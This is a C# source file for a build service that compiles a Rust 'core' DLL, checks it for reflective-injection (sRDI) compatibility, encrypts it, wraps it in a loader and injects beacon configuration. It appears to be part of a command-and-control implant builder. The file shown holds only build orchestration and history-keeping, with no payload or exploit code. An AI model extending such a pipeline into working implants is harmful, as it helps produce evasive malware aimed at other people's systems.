using System.Collections.Concurrent;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Extensions.Options;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Configuration;
using LibraNextgen.Service.Models;

namespace LibraNextgen.Service.Services;

/// <summary>
/// Orchestrates asynchronous Rust builds (core DLL → encrypt → loader → config injection).
/// Stage implementations live in <see cref="BuilderBuildService"/> (partial class, BuilderBuildStages.cs).
/// </summary>
public partial class BuilderBuildService
{
    public static readonly string OutputBase = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output"));
    public static readonly string HistoryFile = Path.Combine(OutputBase, "builds.json");
    public static readonly string TemplateDir = Path.Combine(OutputBase, "loader-template");
    public static readonly string IconUploadDir = Path.Combine(Path.GetTempPath(), "libra-build-icons");

    private static readonly string RustAgentDir = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "agent-rs"));
    private static readonly string ModulesDir = Path.Combine(OutputBase, "modules");

    public static readonly Dictionary<string, PlatformTarget> PlatformTargets = new()
    {
        ["x64"] = new("x86_64-pc-windows-msvc", "windows"),
        ["x86"] = new("i686-pc-windows-msvc", "windows"),
    };

    public static readonly ConcurrentDictionary<string, BuildJob> ActiveJobs = new();
    public static readonly object BuildLock = new();

    private readonly BeaconSettings _beaconSettings;

    public BuilderBuildService(IOptions<BeaconSettings> beaconSettings)
    {
        _beaconSettings = beaconSettings.Value;
    }

    // ── Build (async) ──────────────────────────────────────────────────

    public async Task RunBuildAsync(string buildId, BuildConfigRequest req, BuildJob job)
    {
        var ctx = new BuildContext
        {
            BuildId = buildId,
            Req = req,
            TempDir = Path.Combine(OutputBase, buildId),
        };
        ctx.TargetDir = Path.Combine(ctx.TempDir, "target");
        ctx.FinalDir = ctx.TempDir;

        try
        {
            lock (BuildLock)
            {
                if (Directory.Exists(ctx.TempDir)) Directory.Delete(ctx.TempDir, true);
                Directory.CreateDirectory(ctx.TempDir);
            }

            // Check cargo availability
            job.Log("Checking Rust toolchain...");
            var cargoCheck = await RunProcessAsync("cargo", "--version", job);
            if (cargoCheck.ExitCode != 0)
            {
                job.Fail("Cargo/Rust is not installed. Install from https://rustup.rs");
                UpdateHistory(job);
                return;
            }
            job.Log($"Rust toolchain: {cargoCheck.Stdout.Trim()}");

            // Determine target triple + OS
            var target = PlatformTargets[req.Platform]; // Build() already validated the key
            ctx.TargetTriple = target.Triple;
            ctx.TargetOs = target.Os;
            var targetArg = $"--target {target.Triple}";

            // Desktop mode: add --features desktop
            var featuresArg = req.ApplicationType == "Desktop" ? "--features desktop" : "";

            // Set RUSTFLAGS for strip if requested
            if (req.StripSymbols)
            {
                ctx.EnvVars["RUSTFLAGS"] = "-C strip=symbols";
                job.Log("Strip symbols enabled (RUSTFLAGS=-C strip=symbols)");
            }

            ctx.IsWindows = target.Os == "windows";
            ctx.IsMacos = target.Os == "macos";
            ctx.ReleaseDir = Path.Combine(ctx.TargetDir, target.Triple, "release");
            ctx.ModuleExt = ctx.IsWindows ? "dll" : ctx.IsMacos ? "dylib" : "so";

            var buildSteps = new Func<Task>[]
            {
                () => Stage1_BuildCoreAsync(ctx, targetArg, job),
                () => Stage1_5_ValidateSrdiAsync(ctx, job),
                () => Stage1_6_BuildModuleAsync(ctx, targetArg, job),
                () => Stage2_EncryptCoreAsync(ctx, job),
                () => Stage3_PrepareLoaderAsync(ctx, targetArg, featuresArg, job),
                () => Stage4_InjectConfigAsync(ctx, job),
            };

            foreach (var step in buildSteps)
            {
                await step();
                if (job.IsCompleted) break; // success or failure — finalize history below
            }

            UpdateHistory(job);
        }
        catch (Exception ex)
        {
            job.Fail($"Build failed: {ex.Message}");
            UpdateHistory(job);
        }
        finally
        {
            _ = Task.Run(async () =>
            {
                await Task.Delay(30_000);
                ActiveJobs.TryRemove(buildId, out _);
            });
        }
    }

    private static async Task<ProcessResult> RunProcessAsync(string fileName, string arguments, BuildJob job, string? workingDir = null, Dictionary<string, string>? envVars = null)
    {
        var psi = new ProcessStartInfo(fileName, arguments)
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
        };
        if (workingDir != null) psi.WorkingDirectory = workingDir;
        if (envVars != null)
        {
            foreach (var (key, value) in envVars)
                psi.Environment[key] = value;
        }

        using var proc = new Process { StartInfo = psi };
        var stdoutTcs = new TaskCompletionSource<string>();
        var stderrTcs = new TaskCompletionSource<string>();
        var stdout = new StringBuilder();
        var stderr = new StringBuilder();

        proc.OutputDataReceived += (_, e) =>
        {
            if (e.Data != null) { job.Log(e.Data); stdout.AppendLine(e.Data); }
            else stdoutTcs.TrySetResult(stdout.ToString());
        };
        proc.ErrorDataReceived += (_, e) =>
        {
            if (e.Data != null) { job.Log($"[stderr] {e.Data}"); stderr.AppendLine(e.Data); }
            else stderrTcs.TrySetResult(stderr.ToString());
        };

        proc.Start();
        proc.BeginOutputReadLine();
        proc.BeginErrorReadLine();
        await proc.WaitForExitAsync();
        var stdoutStr = await stdoutTcs.Task;
        var stderrStr = await stderrTcs.Task;

        return new ProcessResult(proc.ExitCode, stdoutStr, stderrStr);
    }

    public static void UpdateHistory(BuildJob job)
    {
        var history = LoadHistory();
        var idx = history.FindIndex(r => r.Id == job.Record.Id);
        if (idx >= 0)
            history[idx] = job.Record;
        else
            history.Insert(0, job.Record);
        SaveHistory(history);
    }

    public static List<BuildRecord> LoadHistory()
    {
        try
        {
            if (System.IO.File.Exists(HistoryFile))
            {
                var json = System.IO.File.ReadAllText(HistoryFile);
                return JsonSerializer.Deserialize<List<BuildRecord>>(json) ?? new List<BuildRecord>();
            }
        }
        catch { }
        return new List<BuildRecord>();
    }

    public static void SaveHistory(List<BuildRecord> records)
    {
        try
        {
            Directory.CreateDirectory(OutputBase);
            var json = JsonSerializer.Serialize(records);
            System.IO.File.WriteAllText(HistoryFile, json);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[WARN] Failed to save build history: {ex.Message}");
        }
    }
}
